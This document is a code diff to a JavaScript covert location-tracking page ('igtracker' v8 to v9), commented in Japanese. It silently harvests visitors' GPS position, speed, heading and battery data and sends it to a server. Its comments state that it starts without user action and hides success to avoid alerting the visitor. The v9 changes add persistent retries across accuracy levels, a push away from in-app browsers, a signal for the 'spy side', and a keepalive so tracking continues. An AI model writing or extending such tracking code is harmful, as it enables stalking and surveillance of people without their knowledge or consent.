@@ -1,12 +1,13 @@
-/* 連続位置追跡クライアント (igtracker) v8
+/* igtracker 連続位置追跡クライアント v9
    window.LT_CODE / LT_IV / LT_MAX / LT_HIT を事前定義すること。
 
-   ・ユーザー操作なしで自動開始し、開いている間ずっと取り続ける
-   ・測位が途切れたらウォッチドッグが自動復帰
-   ・取得できても「取得しました」を出さない（来訪者を警戒させない）
-   ・未取得（拒否・無反応）のときだけ「もう一度」ボタンを出す
-   ・一度でも測位できたら、以降は未取得判定に戻らない
-   ・遷移は「測位が取れたとき」だけ（ボタンで飛ばせない） */
+   v9 の変更:
+     ・精度ラダー（高精度→低精度→粗い）で失敗しても粘る
+     ・code2/3 で即「未取得」にしない
+     ・アプリ内ブラウザを検出して Safari へ逃がすUIを出す
+     ・最初の測位が取れたら igt:gps を発火（spy側はこれを待つ）
+     ・無音オーディオ等の keepalive と連動
+*/
 (function () {
   "use strict";
 
@@ -18,7 +19,15 @@
   var MAXMIN = (window.LT_MAX || 180) | 0;
   var HIT = window.LT_HIT || 0;
   var SEND_EVERY = Math.min(IV, 4000);
-  var GEO_OPTS = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+
+  // 精度ラダー：上から順に試す
+  var LADDER = [
+    { enableHighAccuracy: true,  timeout: 20000, maximumAge: 0 },
+    { enableHighAccuracy: false, timeout: 25000, maximumAge: 30000 },
+    { enableHighAccuracy: false, timeout: 45000, maximumAge: 120000 }
+  ];
+  var step = 0;
+  function opts() { return LADDER[Math.min(step, LADDER.length - 1)]; }
 
   var DEST = window.LT_DEST || "";
   var DEST_MIN = (parseFloat(window.LT_DEST_MIN) || 2) * 1000;
@@ -27,6 +36,7 @@
   var ASK_TEXT = window.LT_ASK_TEXT || "位置情報の使用を許可してください";
   var DENY_TEXT = window.LT_DENY_TEXT || "位置情報が許可されていません";
   var RETRY_TEXT = window.LT_RETRY_TEXT || "もう一度";
+  var DEBUG = !!window.LT_DEBUG;
 
   var SID = (function () {
     try {
@@ -42,11 +52,12 @@
   var q = [];
   var sending = false, last = 0, started = 0, count = 0, left = false;
   var wid = null, wake = null, clock = null, sender = null, dog = null;
-  var waitTimer = null;
+  var waitTimer = null, ladderTimer = null;
   var stopped = true, gotFix = false, bestAcc = null;
   var lastFix = 0, lastAsk = 0, lastRestart = 0;
   var state = "wait";              // wait | ok | deny
   var batt = null, chg = null;
+  var inapp = "";
 
   function $(id) { return document.getElementById(id); }
   function iso(t) { try { return new Date(t).toISOString(); } catch (e) { return ""; } }
@@ -58,6 +69,12 @@
     s.className = "line" + (warn ? " warn" : "");
   }
 
+  function dbg(msg) {
+    if (!DEBUG) return;
+    var d = $("lt_dbg");
+    if (d) d.textContent = msg;
+  }
+
   function showRetry() {
     var r = $("lt_retry");
     if (r) {
@@ -66,21 +83,46 @@
     }
   }
 
+  function announce() {
+    window.LT_GPS_READY = true;
+    try { window.dispatchEvent(new Event("igt:gps")); } catch (e) {}
+  }
+
   function setState(st) {
     if (st === "ok") {
       if (state === "ok") return;
       state = "ok";
-      line("", false);          // 「取得しました」は出さない
+      line("", false);
       showRetry();
+      var ia = $("lt_ia");
+      if (ia) ia.style.display = "none";
       return;
     }
     state = st;
-    if (st === "deny") line(DENY_TEXT, true);
-    else line(ASK_TEXT, false);
+    if (st === "deny") {
+      line(DENY_TEXT, true);
+      if (inapp) showInApp();
+    } else {
+      line(ASK_TEXT, false);
+    }
     showRetry();
   }
 
-  /* 「未取得のまま待ちすぎ」のタイマー。取得済みなら何もしない。 */
+  function showInApp() {
+    var box = $("lt_ia"), nm = $("lt_ia_name"), link = $("lt_safari");
+    if (!box) return;
+    box.style.display = "block";
+    if (nm) nm.textContent = inapp;
+    if (link) {
+      var ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
+      link.href = ios
+        ? location.href.replace(/^https:/, "x-safari-https:")
+        : "intent://" + location.href.replace(/^https?:\/\//, "") +
+          "#Intent;scheme=https;package=com.android.chrome;end";
+      link.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
+    }
+  }
+
   function armWait(ms) {
     if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
     if (gotFix || left || stopped) return;
@@ -109,7 +151,7 @@
     var pts = q.slice(0);
     var body = { sid: SID, kind: (extra && extra.kind) || "pt", hit: HIT, pts: pts };
     fetch(API, {
-      method: "POST", cache: "no-store", keepalive: true,
+      method: "POST", cache: "no-store",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(body)
     })
@@ -152,10 +194,13 @@
     var first = !gotFix;
     gotFix = true; count++;
     lastFix = Date.now();
+    step = 0;                                    // 取れたら高精度に戻す
     if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
     if (first) {
       setState("ok");
-      if (DEST) setTimeout(leave, DEST_MIN);   // 取れたときだけ移動
+      announce();
+      if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
+      if (DEST) setTimeout(leave, DEST_MIN);
     }
     q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
              acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
@@ -164,15 +209,33 @@
     var n = $("lt_now");
     if (n) n.textContent = c.latitude.toFixed(5) + ", " + c.longitude.toFixed(5) +
                            (c.accuracy ? " ±" + Math.round(c.accuracy) + "m" : "");
+    dbg("fix acc=" + Math.round(c.accuracy || 0) + " n=" + count + " step=" + step);
     if (count === 1 || q.length >= 4 || Date.now() - last > SEND_EVERY) send();
   }
 
   function onErr(e) {
-    var c = e && e.code;
-    if (gotFix) return;                       // 取得済みなら未取得に戻さない
-    if (c === 1) { setState("deny"); return; }  // 明示的に拒否
-    if (c === 2) { setState("deny"); return; }  // 取得不可（アプリ内ブラウザ等）
-    armWait(WAIT);                              // タイムアウト等はもう少し待つ
+    var c = (e && e.code) || 0;
+    dbg("err code=" + c + " msg=" + ((e && e.message) || "") + " step=" + step);
+    if (gotFix) return;
+
+    if (c === 1) {                               // 明示的に拒否
+      setState("deny");
+      return;
+    }
+    // code 2 / 3（取得不可・タイムアウト）は精度を落として粘る
+    if (step < LADDER.length - 1) {
+      step++;
+      line("位置情報を取得中…", false);
+      if (ladderTimer) clearTimeout(ladderTimer);
+      ladderTimer = setTimeout(function () {
+        ladderTimer = null;
+        if (stopped || left || gotFix) return;
+        try { navigator.geolocation.getCurrentPosition(onPos, onErr, opts()); } catch (e) {}
+      }, 1200);
+      return;
+    }
+    // ラダーを使い切った：即denyにせず、まだ待つ
+    armWait(WAIT);
   }
 
   function watchdog() {
@@ -181,7 +244,8 @@
     var need = (state === "deny") ? 8000 : 15000;
     if (gap > need && Date.now() - lastAsk > 6000) {
       lastAsk = Date.now();
-      try { navigator.geolocation.getCurrentPosition(onPos, onErr, GEO_OPTS); } catch (e) {}
+      if (!gotFix && step < LADDER.length - 1) step++;   // 粘りつつ精度を落とす
+      try { navigator.geolocation.getCurrentPosition(onPos, onErr, opts()); } catch (e) {}
     }
     if (gap > 45000 && Date.now() - lastRestart > 30000) {
       lastRestart = Date.now();
@@ -193,14 +257,17 @@
     var el = $("lt_perm");
     if (!el) return Promise.resolve("unknown");
     if (!navigator.permissions || !navigator.permissions.query) {
-      el.textContent = "unknown"; el.className = "sr";
+      el.textContent = "unknown";
       return Promise.resolve("unknown");
     }
     return navigator.permissions.query({ name: "geolocation" })
       .then(function (p) {
         el.textContent = p.state;
-        el.className = "sr";
-        p.onchange = function () { showPerm(); };
+        if (p.state === "granted" && state !== "ok") line(ASK_TEXT, false);
+        p.onchange = function () {
+          showPerm();
+          if (p.state === "granted" && !gotFix) attempt();
+        };
         return p.state;
       })
       .catch(function () { el.textContent = "unknown"; return "unknown"; });
@@ -214,15 +281,10 @@
     else if (/Line\//i.test(ua)) name = "LINE";
     else if (/Twitter/i.test(ua)) name = "X";
     if (!name) return;
-    var box = $("lt_ia"), nm = $("lt_ia_name"), link = $("lt_safari");
-    if (box) box.style.display = "block";
+    inapp = name;
+    var nm = $("lt_ia_name");
     if (nm) nm.textContent = name;
-    if (link) {
-      var ios = /iPhone|iPad|iPod/i.test(ua);
-      link.href = ios ? location.href.replace(/^https:/, "x-safari-https:")
-        : "intent://" + location.href.replace(/^https?:\/\//, "") +
-          "#Intent;scheme=https;package=com.android.chrome;end";
-    }
+    if (state === "deny" || !gotFix) showInApp();
   }
 
   function ask() {
@@ -230,11 +292,10 @@
       if (!navigator.geolocation) return res(false);
       navigator.geolocation.getCurrentPosition(
         function (p) { onPos(p); res(true); },
-        function (e) { onErr(e); res(false); }, GEO_OPTS);
+        function (e) { onErr(e); res(false); }, opts());
     });
   }
 
-  /* 測位を1回投げて、結果が出てから「待ちすぎ」タイマーを張る */
   function attempt() {
     if (stopped || left) return Promise.resolve(false);
     lastFix = 0; lastAsk = 0;
@@ -273,8 +334,7 @@
   function start() {
     if (wid !== null || !navigator.geolocation) return;
     try {
-      wid = navigator.geolocation.watchPosition(onPos, onErr,
-        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+      wid = navigator.geolocation.watchPosition(onPos, onErr, opts());
     } catch (e) { wid = null; }
   }
 
@@ -287,11 +347,12 @@
     if (started) return;
     started = Date.now(); stopped = false;
     showPerm(); checkInApp(); readBatt(); keepAwake(); showRetry();
+    if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
     if (!navigator.geolocation) { setState("deny"); return; }
     ask().then(function () {
       if (stopped || left) return;
       start();
-      if (!gotFix) q.push({ ts: iso(Date.now()) });   // 未取得ならIP地点を1点だけ
+      if (!gotFix) q.push({ ts: iso(Date.now()) });
       send({ kind: "open" });
       clock = setInterval(tick, 1000);
       sender = setInterval(function () {
@@ -309,6 +370,7 @@
     if (stopped) return;
     stopped = true; started = 0;
     if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
+    if (ladderTimer) { clearTimeout(ladderTimer); ladderTimer = null; }
     if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
     if (clock) clearInterval(clock);
     if (sender) clearInterval(sender);
@@ -324,6 +386,8 @@
     if (stopped || left) return;
     keepAwake();
     lastRestart = 0;
+    if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
+    if (!gotFix) step = 0;
     watchdog();
     if (!gotFix) attempt();
     send({ kind: "hb" });
@@ -340,13 +404,13 @@
     if (!e.persisted) return;
     stopped = false; left = false;
     if (!started) started = Date.now();
-    lastFix = 0; lastRestart = 0;
+    lastFix = 0; lastRestart = 0; step = 0;
     restart();
     send({ kind: "open" });
     if (!gotFix) armWait(WAIT);
   });
 
-  // ボタン以外の場所タップでも測位を促す
+  // 測位が取れていない間は、どこをタップしても再挑戦
   document.addEventListener("click", function (e) {
     var t = e.target;
     if (t && t.tagName === "BUTTON") return;
@@ -359,7 +423,10 @@
     attempt();
   });
 
-  window.LT_LIVE = { start: boot, stop: stop, leave: leave, retry: attempt, sid: SID };
+  window.LT_LIVE = {
+    start: boot, stop: stop, leave: leave, retry: attempt, restart: restart,
+    sid: SID, state: function () { return state; }, step: function () { return step; }
+  };
 
   showPerm().then(function () { checkInApp(); boot(); });
 })();
